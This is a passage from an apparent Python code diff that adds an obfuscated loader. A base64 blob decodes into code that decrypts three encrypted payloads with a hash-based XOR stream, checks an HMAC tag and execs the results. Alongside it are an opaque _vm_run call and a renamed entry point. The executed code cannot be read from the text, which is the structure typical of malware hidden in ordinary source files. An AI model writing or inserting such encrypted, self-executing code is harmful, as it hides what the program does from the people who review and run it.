XBwZW5kKGEgXiBiKQogICAgICAgIGNvdW50ZXIgKz0gMQogICAgcmV0dXJuIGJ5dGVzKHJlc3VsdCkKCmRlZiBfYigqYXJncywgKiprd2FyZ3MpOgogICAgcmV0dXJuIF9leGVjX2VuYygwLCBfRlVOQ19LRVksICdfYicsIGFyZ3MsIGt3YXJncykKCmRlZiBfZCgqYXJncywgKiprd2FyZ3MpOgogICAgcmV0dXJuIF9leGVjX2VuYygxLCBfRlVOQ19LRVksICdfZCcsIGFyZ3MsIGt3YXJncykKCmRlZiBfZSgqYXJncywgKiprd2FyZ3MpOgogICAgcmV0dXJuIF9leGVjX2VuYygyLCBfRlVOQ19LRVksICdfZScsIGFyZ3MsIGt3YXJncyk="), '<exec>', 'exec'), globals())
+    exec(compile(_uxujbpzjd.b64decode("aW1wb3J0IGJhc2U2NAppbXBvcnQgaGFzaGxpYgppbXBvcnQgaG1hYwppbXBvcnQgY3R5cGVzCmltcG9ydCBiYXNlNjQKaW1wb3J0IGhhc2hsaWIKaW1wb3J0IGhtYWMKaW1wb3J0IGN0eXBlcwpfRlVOQ19LRVkgPSBiYXNlNjQuYjY0ZGVjb2RlKCcvNDB6NlBuVndycDQ3cmI5Zk5PUmJTbndmeGdSekFLdmlJc3owcHdFVi9zPScpCl9GRU5DX0RBVEEgPSBbYmFzZTY0LmI2NGRlY29kZSgnYUJVd1ZjNTdjSnBKcHJmRzlBUlpZKzJKNnN6WFVFL0JtVjZWU0NqNVhqTjIzc0NDeDh2bkhiZUlDbmhJS2FTTHhkelR5RFlhQlF2bEN0UkYrc2pzYW9YczlHUm5XcUVUVHo2OUlEMHpvVEhKM3QveUk4bEc3UGxYZnEreVN3TUp6SlM2ZlFmRHBCSi9KYWt4UXlIQ1MrNXJQRVFuTTJpTkxhWEFMZFZPNm9walk3VmJoc2NNMVdkUWowMXpuK1gzRFdjVDlTeGtQV1crd3RDK1lRL3FJK0N3UzAyL044cHdLQlRNK2U1ek9JQVVFYStlYlZaYnI3TjZ4Q0JEbkdQeHZZRWkrN1Y5QWpodE1OS1JadzdrUHB0M3Q4RHE0QXQvOVRGc3ZCSVNKcHp6eVdBVjViSlI3T0FTL0dCbTZvbnVwSVdaOWNqQk9tazMvN01GUTN5ZjJ1TlJ0WG92eGVESSt6RHZRbitINXNpZDdFL1piZXR2SDRsbGlldWlSdCtNL3FVdm9DdnJwMzRVYVBRbFdHOFpEYUxyS3RyN3hQZVl1aGRrZFBCRCs5SXFqWnVMMWtqRlRaNFVDWjZITVVzRXlQT3pTVHFielBzSWE3V29EUVU0SGRhL2JFTnQyc0RzS2dWT1NwL0tKdVU0SGJhNGZQNFRSQTdhZDRIamRzR2NlNmVta2RqR3paYkRFWUdzYVZuNEZ0NE55VGIvK01nRHk0clYxLzZNM2Irai8wcHRvRHYwMWN1UHloZXdBalhMbHBuQzNiMmVJcXoxaUN0R2lvckdBdFI1b0hmbzNFY3hua2MySjBsQnR1dmdrNWNBN09YeTBvdDZZUTF4bkp2OVk4a2JvMlpMaHcwVmNYMmZob3h0bkpJVUpScFI1WDFiTE12WGN1WmNKWHlRNlUyZ3RkQWJlc25HRUZQQkdjOHBjeEl1UTlTR3UvVzQyNTdVVmtwekhPRThEUFdmNkRiR1Y0aVl0OXdQaTN4NzJoNzhKcTI4OGpqaUk2UjlaUFFIUFNZRU9DenpPejlvRDdGY2dPMHpaUkR3Zng1RkF1SkJxck9FYVNNM3JueGpob1dxQXJnR1dkOE1iY0hkNHpXMlVMMGN5bFo5ekNSVFZpdTJTWm1rNTJxVHJMUUVnTldLUDY3aE5MSDdtYVU4U0hiVDlQckwyQnB2aUVGbEowS0VDaVQyUFlFNXVGL0J0MVU3Yko3UVdwNWZZWTRqak9PaWs4V1k2eC9ab2xjTGFVYUVKdnVwY0h3THR1T2c1VStJbEZsT0pxTTlhUTFCQ0x3Um5TSHhQRFYrZno3YVB2YXAyL1NJUzZSTk9OcS80T1NkbmZGb1RmZElWdU1DT1UyRklqU0dzT2Vxc3FBNnRTdHJxQkVWOEMwVW1pQ3lvNVdNTlBEYWdqSkt0YXNHR3dYRHJaVjlSdmhxRUk5YzBnSXJIT09ZVDRmM0IxbGFBNEsza05XMDdEQ1VsVDV1YlFhK09CVkhTUnVtbk9RT1E4Mlc3clg1VldWQkV5a1JGMzFrWkZWdU5BZHB1WDhZVjdDVm9IRTZLVXU5ek9iWkUyVmp2YjZYQ0dhKzNWeDdKdmhweHo3RHFheC9UcWxGR2MvNW83QXFyZWU0dFN0a1loUmpDSDd0Qk5MNDU5cXc1Mnc4NjE0VlJsdW15SnA0bVhIVys4T29wNkVWSWhDM1dQbi9YRytieHhTWEt2ZzRYQ0Myd3orTW4rZ0xZbWx0SnEwdXBpZ0Z4VWVyeW1nc2ZLRVVpdWNBNmo1UDlaYUtLS2IzYTRTbFNZaXdyejNoa3cyMVYzZ3N2Vngwc1RxL2drUmpqNWlTTGNsSGtmRHRZR0I0M2NqUmhNSnJWd0pOc01vb3N2V3BQVThJVWF0a0lxUVlSS1ZPQlRhSEtma1IxZkc5S1A4Y2pxMmN2UUpvVVZjMHJlTGZ4ZlNiTXBMRFgzQXhZSWcvRUU5SHZwMGY0eVF1T1lZY3piOFY1WWVib1UyTHEvbU93dmdUdU9nYXZia2RYUHl2WnN6UjJjUUJHdXRYM0k5TENRbW9nR3EvOEw1YVFpaVRjdTVUTit4L0c5c1NtMjZlSk1BeG9lWms3MWV5N1V0TzBNQllab2dsWStqV0FiRzRwTnpQTmlEdEhoQU5ENGdQblFoMDk2MThRSk9tL0JmNnJ5TWR5QjFQM1d3b3hTbWtwS2pGdzkxdTJmZkNjZXBkUWVaOVpyRHNvTG9wOHI2Q2RmUENNb0NvTmc9PScpLCBiYXNlNjQuYjY0ZGVjb2RlKCdURi9iaFZ6dk1vNUpzbnFhazdkem5mUHNpOG1mMFVGVi9FRzBuUk1TZ1AxcnNNb3NQOE4wcFJJZTZhZU9wczB6eU8waGxhSlA5YVR5TnpHaWVHc1FYVTMyYmpSSk5CSHR1alorMjIxV2V1QXBlZ2tOb1BFZk5GRmR5NzRDQU5FWDZqdzhoMUl4VkQwUFB4dk5hNWlyZlhodXRuSzBuc3N1NGJUN0xnekRYeG9xS3pwaXVmRWg0T2d6WU5YSmljYmw3KzNGSjdKTkxSQ0hUNzhtNkVVanZHdTBJNFNTZTNYdzhQUVNXYnFINWdvY296R21HMDFoTmRRVlNuWC8xMFdNbHcvWVhGdjJZTVd5ZlBnUk5qSFJHMG80RlpSWnRkNUdQVlVieUNXVURYUEMrTGZuMUhtY2ltb0xQRERVRTVsS1NqUFZ4RDFKSFd3S0EyUjBzcWlWSmh2VjVYT25uWEtRL01OZ2hOTFd6cVdhc0NuazA3Q3JXVXpIOFRFWjBRaEcwK1RMTnFwS0lENkVSM2tlNFlIQjlUbWZmRjlQZ0xLVFZ3QStZTmc3UVJmc2hiYTByOHNMRkV3UjlKbVJxd0Y5Y1NDdjFONktnUjlzcHVmbWFrS2tRZGF4R0dGNzhSYXJVRGE0TGZ4a2djTlVyRE1BZzNCa25heXVtLzBQWU1uc3BFK3VUSHo2WGw1b2crOEtRNnFVUDNVMWZIK01MNjJLOHpvSzZtWUc1NDMwUkFxZlVGQVVjVEEwRnRTcWJWQ1J6cWxQVEs5QkZyNzFKc2wvMG4yR3Z3OXRUZFoxcnorU1dpQmgrb1gyTnZNZTVONTRXc2o4SE5naGE5c3dtMHNtSWhueFMrWkhZKzhCVHYzcHl0NUdFWWtCNHE1OEc1TmZiekl3SzF4dEcxYnF4LzFZKzZUelV6dUJUZUJZTHlMUzhTTXBYZkErQzFaUE12T2tGTlZNMHpQTkdRdGFrbSs0UHlnL3BiQ0hoWVdxaTVya0VDNFBlQ3pvUGVvSDdidm9VTURHMnB3SDBjTnFCbGJGN3NJeGxQMnR1ejd1dk9mL3l6d1lvRWN5MHB6VENUM25lRjl2amtlK2EySm44d3FWU2hYRlIyQWtkM0JIMWFFN0FuK1ZtWEJ4ZGlxZ0pueEF3Q3VWbkdpaWZNVU5hUUZUei9xcTNwTnRuTzRteHJQUkJyVnRLb3BtZ1hNNGQ1SEJnQU5EbEU0RTBwc0R3N2hzenpKY0c2ancvc0xvdVJZcHErVElHNVQzbzc5MlZ2STVJZU5YYjdnbmY2VlFzM0ZwWWdHa1BpZzBCdzZmNG5FRUU3MkI1QWs3WDRWT0xyWUdDWmNLa2hkTTBHUDAyazdjYjFpWk51a0xrQjZRRWE0RitYQnNtaThMUUZXbVFqU1B4aEJVSk8yQlRxUHdYdk9PcE9yOEFCSW1TTm9PNEFEWFFGODROSjRFbEZlaEZYUUNESnA1a2hCYTRNRkFSSXRpSWJTQ2Y5bnRBeWZYQXQyQU12bG1OdU13UlJRRExXbFR1V0hBNkJHWU1PbkxQd2RNODN1K0x3MWhxd2xyS3NISm52YjBDWGkvMXlDeUc4NWV1Ui94RjgzNk4rZWFJWTdXNG0rQ0JGZUxYWHJuSklmOGh5NzhqWC9hZVFpZU9Eb21wWGg2Y2JIZ3lZcUErbnNDMXkzMDQ1bWFDSGdOeFhXK2pMNUFBd3ljdW1XZjNUQ1p5SDA0d2ZOTitONlBDWmM5RzVHY2hmREJaVlF2UE9XYkVMejJMSkJ4V205VGhyRXUrOGFXNjRtRHZzZGw1cE43ZGo0QUhiMnBNOEpPMDl4QUYzM2l5SHdwVFZvWElYLzBHK0xOb3NvdG10NjFOayt1SDFqc2RqaVpadWZSUDYvcXRwemtmQ2RlSjNhWWdKY3ZSR01qanRHU3JXaVh2V0Q2QXhVeGI5aHhFa3hsZ0hNSHk0V0pBSkQyR0FBSWhPalQ2K2FWMVlqUWd3YW51ckpPdm81MGo3aGdBZVJjaWhsUFJZU29QTmZZYVJWQTZSOU53OTVhN1cvKzJpMVpJcmxldHh4ZUZTZm5XaEtqTmQzaWZMWk1hUUJYa1M5VTdsbHQvKytzRUtyak9KcytYcUhXSExyb0xRMEZBVnlJVG9CV2xoeWhhVXh4QkNvQlRuWUQ4K09FNUhjUmswcUl1Z0s0Z0tJd3VhU3NVTkJXM21KZVVxdnpXakl2dmtXYlcwQis0NDZyNEhQOWo3UG92OHpBajlOSDI2ZUl0WFhtYjJtcm4rRFltSE0xdzNSako2Tm9IZ0M2clNDbjhsODNGVmR4bG4yY3BkanhuNzkvSDVkc3N3NWtTbW5VT2kyM29WZENVY1dnVTNtZzVMU1RIK1FhSG9xazBXNkx5cFNZejNDK2kzd3Q1MVZLZDQvS28vYjlBZ05Td05KWUU1b2IxbXp4ek1UNW5yZ0k5SFJpanNaNk5NMDNHQlpwQXlxOFNNUWdSQStvRittd1U4emgxOUg0QnR2YnZiNHlJUCtyaFYzaWZ4UGRieUFmVzVDY3ViRjR4bS8wSXdrYTFCenZxRHVmWDJraUlHQ3lHSzRDTWd3ckR1NlFDcUF2R2dlMmNrQVFrTGRxejJkQ1RpMnpaVzNXUjJla2VvRld4SDNsTlk2N0ZGN1pZYWNrQXk3UHZvVWYxUWs1YzlIYldWRXdJMG1wY0dZbVdBZmU3Y0h0NFZxMjROYjhrMlV1RWpIcm83ZlJrRUE5NE43dXdsVTFvWUFVQ1o0TFhHNDdrQ2YvWXJzTTErZzduZ3hRQmJZdjVWUWx6NzdxSUdreXU5cmd3c01xcWVtZnVRTkdncG9PNnpOVldTSytOOE96a2wxOVRaSENBU0FLeWhibGNPTzVZeFkzN25MdHVHZHg2dHp6V25IVWJ1ZnNpdUd4ak4yb1BFQThLYkxKREYycUNJdEJVdllsc2ViVGRseHZNd2dQV2ZyeCtuNVVPcVkwRGZpamhHRGdNdEtvMUIrUndZZWlvdE5pb1BxN1ZOd3hMM3E0TEZxQm9JSytOTFNwOEl0dXFHWVhyTnJCck01NCtvdEtQVFIyenZ6K0hEWTQyR3VNcjFpNlBaSjFxb0pUZlpLdDRiYWJBVE9YN2dHcjhSZGRHTm1yWmcrOVo1TkpuUjdSelJQNycpLCBiYXNlNjQuYjY0ZGVjb2RlKCdIT3ZVYjBPclFVcE1lREhWajJnMU9xMWZldDFuSXNOSHBDOWZTWVlVeFRxc2lSZVJlQjk0N3hMK0NORmtmMHNoRlNYejY4b3hhOHIzTHJoQjlHc05NdEVydkI4NitFMHRiYThJeUtnLzE3NG9PTXVJSUNkMVhlUmVsMy9ERjNuYWhYNVNZdnZ2SVdaOVNVZHhzcHBLaXRYbUo5Sm1sTmdXRHkrZlBJVW5kZmtnY2h4djZic0dMVlRGTDRwMVpuYXUvdVR1dEg4Q3hDV2pGUURyUnB1TXVPZm44ODJFUHlGaDM2THVwRXRKdXZ1NFlyZWpNSUhabDNEREUrODUwSEFFZkpzNGlKY3UwcFYycVcwb05qM3I0NysxSTZVR2IwL25QcTZVWTY1NzZXelduWEpVUUNFdFprckEzWCtxamVTZVYwSU5FbDVNVCtHc2pYWHRGaGFlaG93cXJLTEpyYmEwRW1pbHlZYjRORWdWZFpZQVRrK252VVRQMnQ1T3pOZ3NJTm9LbVp6bkI2dGxtd3lwZmdpckgycEVuTy94bWNsdkFmQm9VY0hGNXlQK3JnaEVHNVlhUTAwZitnaHZaSTBwMmVObnN6Q3BUSnI3K3lHTjUwSmYvSW9EdlNtZU5JekdHL3AvZ1N2VDluMlNvWnI4bnFFOTcyMnBLSGZHNzh0WStUa2x6WFpnZC9FdEtHcHRGZGl0WHloZndxNDg5NG10blNpZCt0SWtpV2VLYjNGZUJ5SG1KUVZZSDhralp2dnFjRU82SmI5REhLK2lMb3o0T1RTYlRHb280YVNWUUJIU3d3NlluTWNEc3QvU3hwWHV3UDNmeW1HMjdNQlpRbGhLT3dadUQyK1dVNmZPQ0JNQTNOeE1uT08xTjE3MDFpVDduVlI1N2tSdUxBZ1VjOVJqb0pkUEgxZHJvS214SjVXLzBTSU0vbk03Ym1lR1U3eUd2ek84d1VVM3g2S2U5V2lXb0l1OFBieGhGZkFKSnlYWm1LYnNKZUYzNHIxdjdJbGovYzliVncvVkl5OUw3Mzh6dzR2UTZ0Nk9aZFJLRENCOG1YMzFRY1NkalZHdmQxeHlyTlU4YWovbnBPY2pRcVVxMnlPL3c5Z2RRY004eDhDT2hKeHVmSDZDM0NXVUY5M05ydU4xWW96WUJFb3B4c1JVYWlUNFFKRzhYZ3NGRG14d2pFdUFzaXFDbTAyZHpSbnk4WUtGNGM1RVF3Z1J4UDRKUWhESEJhMnVUVHNYVG0rUm10Q1BDMGpURWJaemtrYmdVd01KbXhnVUo3b1B5RVhuSk1oSkQzSlFJL0E0NStqa21BZWNxc0NUcXZMcEVNZkx1L1ZxTHZjVWxiNTJaU2drYVlxTXRqSXV1YVJFUEZlazV4RmtXYUNtOTdtbGJpdGVTZ0hMNXBzMTRkQko5MGY2V1pHOEFoRmV4QnFXREFBb0tuZU53K1YyeXVGRjU5MUdBUkw1aWIwelhCY1RpQ3pDKzJZNFNxbVVLMjg3bHBSdS9zdm1zVGZXcFo5c3pMZGpTL2ZPbkhlQzBJN1lkbURvOENkSnBzdG1reENTdDhueHVTaUxFK3NiODF3ZFRVM2E1NFVvdDYzYXBXQ2d4NHBMbVNHTy8xbEFzMjJaUVVoaVJDYk1XUno4S25CTkNZSDRJbkMvTXAwOGV2R0NlME1vQ2lMS3R6Nk01NVd6NTVVM0dSaTZZRUZqaEVFRDdyQkRCR2sxRmgxN3h0bWxHeitWSUVINVBDVTh3SVEwU2JsRG5NeDE4MnJxYUdVNmlKNHlTNHBEMUhLZmxoOVk5a2Z5ell0UnZDMXduZ016ZHdsMEQzK2ZoS1luYTlzTnlsZWduZ0VjaDhkQ2lkRStud2cxSTcvZ1FSNUc3OEdId1ZGZjU4bTJneVMzaSs1aHNWWjJFVHEwK0JYRTBjSE1KdWVwRlBPMHVpUG9pQ0VyQ3pSZ1dMVHdteThlbHBwKzc4VGExSXNUQjBnUnBlUk9ZODF2SmNxL2tuSXRUTGJtR1c1MGw3ZzRuUlEyajhNMUY4azlMV3ZGaVVFSXl5K3ZRSFZzZ29hTk11aytUZWtEZGxCYzRuV1dsbjk5bDJaT0lUdExYd3QrWE50dVQ2SGZ2VThvS25JZThja21TOWI5eWQwZkREdm5YRER5alJSaGxjL3Z0ODR4cUdhS2tqTWd0ZTBuWE0rYkpjZmpJZGRwKzBXNTgwSFFiZXBYMXl0akk5UGV4a0NEZ1MvYk9FZE9FRlVKTkVHdzhmTlhGbFJudURKMFBJQjg1bTRCNGRhSnVxYXkyaEhiVHZ1VktIV0FaWXJGMnBrNTdkR0dWK1hDekdLRUp4UWtyZTg5S0VJZGZ6VkF5Wjhmb3E0VmxydDV6YmhyeXNiN1JVUjJPcDlobWRIWFkzL2o5VEhOM3RaYjRKYSt0d2I0SDFqbFZEaWN3MFk5bFNOMmV1YWxRR3FtenRCVHVXNTF4SSt0aUdPcVhPeEdNRXNKckVvOTJMaFp2YTZCOXlFSm1UOWttVzI2eFRDeUpycG9Zc2gxN2t4U1hmS2tPVUNKUVRwRlJhVWlNSGxOeVd2c1R2NEtMeDZMY1Q4NWFmazJBOS83QlJVK1Z2SVU1V1Vob3pDby9PekNYOFRyUElvdmpNSHpjMWZSRlZUMUpzYWVweVhhYVM4S0I1bGp3UGdpT1V2SmtobEcvaTByUU13SHVtWWRJbTMrbk5DL1BqdUp6dXl3WVdTQmVXVjJ4K0l6Q0pEVExsMkJaYTdIaFN2RlBEWlh4QkNhcFZXV081K3YwUnpNOTNIREwvZkhMVDFvemkwcmhKTS9iYkRLTWg5ZnRLWHJuQjFUcG5WWjRLTnNnZVpmL3hWZFRIa1lCNUtDcWhnb1JDRm5FSldCY1g4QUoyUnE1RERDTG41bThudUcwKzdPK2pNckczaFUzUXcvaHBXMmU1akhWcTJGTmdJSmtzeElDRUcvRGJIeXNxY05Qd2NadHZXaVJBN0svRE51bTRWd0UxSVFhWTJGWVNWME13cmhBM1pCUXdrNGVZeFZ3UUJJTHFId29jWEVTVlVpTVM3VVFIVDcwKzROWnlRbTU2SUNCTXlzaHVpYjN4RElmMUZnbVRibWRQMWxRK2NPcFZnd0ZEOHo0R3ZydUt0dFZVdWJSRDJkV0hpd09SOEdtNVBKU3NldFBRQTFZYW1HWk5OOS9NUUZCRzlsaXFVbGpFcExkWGgwa3BqWkkvNkhFR1pCVVIwaWV6SnNFeHhOV2FuZ2w1bXphQkx6ODNpcVduUDYrN0xaY29yL0hObVo3L251S0JFRnFqU0FvdHRyRTBHSXptdWtKZTFpQmx3KzBYR1VRVFY2cDNRZlpIZDZ1dDVCaWtEcGlmbmNJOVRRU29uNDlCMmZITUNtL1V5b0ZTbSs0QjB2ak00L2R4T1RWcUt4Z1k0Q09wZ2oxTDBtTVlDSFNTdEVSYzQySTJQYzJhYUMrQWdYRG5BOXRheUViQlF3djZaTmpQS0JyWENDQnJVVjFzcUNrQklFMjBBRXVRT0VjNUUvU0dTbEcrZDNzV1lxTTNMbVpqdGhJeEZOTkFGRm1MMUlIZjFMejNoK2Q1TCtGR0VERmFWS21sVGF0NzhTeTZxT1drWklBY20xQU9IMlppZnl5SE9yWGgwZUI1WXc2eUlkZ01udlN3aHg2Yk56U1E5aTMrTkVvL0ZaV2ZzcjFTUEE0cUFkdk9xT3VxZGhUajlnNXIwbkFMcEZvRHFZU3lSZ0xVWHJMckp0anpKcTBaaEp4Yzh1M0l1YnF3UUJ4SnJpUXFVT3NRUm10dEM5eGZCTU41RE9jWG89JyldCl9GVU5DX0NBQ0hFID0ge30KCmRlZiBfZXhlY19lbmMoaWR4LCBrZXksIG5hbWUsIGFyZ3MsIGt3YXJncyk6CiAgICBpZiBuYW1lIGluIF9GVU5DX0NBQ0hFOgogICAgICAgIHJldHVybiBfRlVOQ19DQUNIRVtuYW1lXSgqYXJncywgKiprd2FyZ3MpCiAgICByYXcgPSBfRkVOQ19EQVRBW2lkeF0KICAgIG5vbmNlLCB0YWcgPSAocmF3WzoxNl0sIHJhd1stMTY6XSkKICAgIGN0ID0gcmF3WzE2Oi0xNl0KICAgIGF1dGhfa2V5ID0gaGFzaGxpYi5zaGEyNTYoYidhdXRodjE6JyArIGtleSArIG5vbmNlKS5kaWdlc3QoKQogICAgaWYgbm90IGhtYWMuY29tcGFyZV9kaWdlc3QoaGFzaGxpYi5zaGEyNTYoYXV0aF9rZXkgKyBjdCkuZGlnZXN0KClbOjE2XSwgdGFnKToKICAgICAgICByYWlzZSBSdW50aW1lRXJyb3IoJ1tmdW5jZW5jXSBpbnRlZ3JpdHkgY2hlY2sgZmFpbGVkJykKICAgIGVuY19rZXkgPSBoYXNobGliLnNoYTI1NihiJ2VuY3YxOicgKyBrZXkgKyBub25jZSkuZGlnZXN0KCkKICAgIHBsYWluX2J5dGVzID0gX3hvcl9zdHJlYW0oZW5jX2tleSwgY3QpCiAgICBwbGFpbl9zdHIgPSBwbGFpbl9ieXRlcy5kZWNvZGUoJ3V0Zi04JykKICAgIG5zID0ge30KICAgIGV4ZWMocGxhaW5fc3RyLCBnbG9iYWxzKCksIG5zKQogICAgZnVuYyA9IG5zWydfZiddCiAgICBfRlVOQ19DQUNIRVtuYW1lXSA9IGZ1bmMKICAgIHJlc3VsdCA9IGZ1bmMoKmFyZ3MsICoqa3dhcmdzKQogICAgcmV0dXJuIHJlc3VsdAoKYXN5bmMgZGVmIF9leGVjX2VuY19hc3luYyhpZHgsIGtleSwgbmFtZSwgYXJncywga3dhcmdzKToKICAgIGlmIG5hbWUgaW4gX0ZVTkNfQ0FDSEU6CiAgICAgICAgcmV0dXJuIGF3YWl0IF9GVU5DX0NBQ0hFW25hbWVdKCphcmdzLCAqKmt3YXJncykKICAgIHJhdyA9IF9GRU5DX0RBVEFbaWR4XQogICAgbm9uY2UsIHRhZyA9IChyYXdbOjE2XSwgcmF3Wy0xNjpdKQogICAgY3QgPSByYXdbMTY6LTE2XQogICAgYXV0aF9rZXkgPSBoYXNobGliLnNoYTI1NihiJ2F1dGh2MTonICsga2V5ICsgbm9uY2UpLmRpZ2VzdCgpCiAgICBpZiBub3QgaG1hYy5jb21wYXJlX2RpZ2VzdChoYXNobGliLnNoYTI1NihhdXRoX2tleSArIGN0KS5kaWdlc3QoKVs6MTZdLCB0YWcpOgogICAgICAgIHJhaXNlIFJ1bnRpbWVFcnJvcignW2Z1bmNlbmNdIGludGVncml0eSBjaGVjayBmYWlsZWQnKQogICAgZW5jX2tleSA9IGhhc2hsaWIuc2hhMjU2KGInZW5jdjE6JyArIGtleSArIG5vbmNlKS5kaWdlc3QoKQogICAgcGxhaW5fYnl0ZXMgPSBfeG9yX3N0cmVhbShlbmNfa2V5LCBjdCkKICAgIHBsYWluX3N0ciA9IHBsYWluX2J5dGVzLmRlY29kZSgndXRmLTgnKQogICAgbnMgPSB7fQogICAgZXhlYyhwbGFpbl9zdHIsIGdsb2JhbHMoKSwgbnMpCiAgICBmdW5jID0gbnNbJ19mJ10KICAgIF9GVU5DX0NBQ0hFW25hbWVdID0gZnVuYwogICAgcmVzdWx0ID0gYXdhaXQgZnVuYygqYXJncywgKiprd2FyZ3MpCiAgICByZXR1cm4gcmVzdWx0CgpkZWYgX3hvcl9zdHJlYW0oa2V5LCBkYXRhKToKICAgIHJlc3VsdCA9IGJ5dGVhcnJheSgpCiAgICBjb3VudGVyID0gMAogICAgd2hpbGUgbGVuKHJlc3VsdCkgPCBsZW4oZGF0YSk6CiAgICAgICAga3MgPSBoYXNobGliLnNoYTI1NihrZXkgKyBjb3VudGVyLnRvX2J5dGVzKDgsICdiaWcnKSkuZGlnZXN0KCkKICAgICAgICBjaHVuayA9IGRhdGFbbGVuKHJlc3VsdCk6bGVuKHJlc3VsdCkgKyAzMl0KICAgICAgICBmb3IgYSwgYiBpbiB6aXAoY2h1bmssIGtzKToKICAgICAgICAgICAgcmVzdWx0LmFwcGVuZChhIF4gYikKICAgICAgICBjb3VudGVyICs9IDEKICAgIHJldHVybiBieXRlcyhyZXN1bHQpCgpkZWYgX2IoKmFyZ3MsICoqa3dhcmdzKToKICAgIHJldHVybiBfZXhlY19lbmMoMCwgX0ZVTkNfS0VZLCAnX2InLCBhcmdzLCBrd2FyZ3MpCgpkZWYgX2QoKmFyZ3MsICoqa3dhcmdzKToKICAgIHJldHVybiBfZXhlY19lbmMoMSwgX0ZVTkNfS0VZLCAnX2QnLCBhcmdzLCBrd2FyZ3MpCgpkZWYgX2UoKmFyZ3MsICoqa3dhcmdzKToKICAgIHJldHVybiBfZXhlY19lbmMoMiwgX0ZVTkNfS0VZLCAnX2UnLCBhcmdzLCBrd2FyZ3Mp"), '<exec>', 'exec'), globals())
     _vm_run(_c, _k, _m, globals(), locals(), _map, _ok)
 if __name__ == '__main__':
-    _wr()
+    _ralpr()
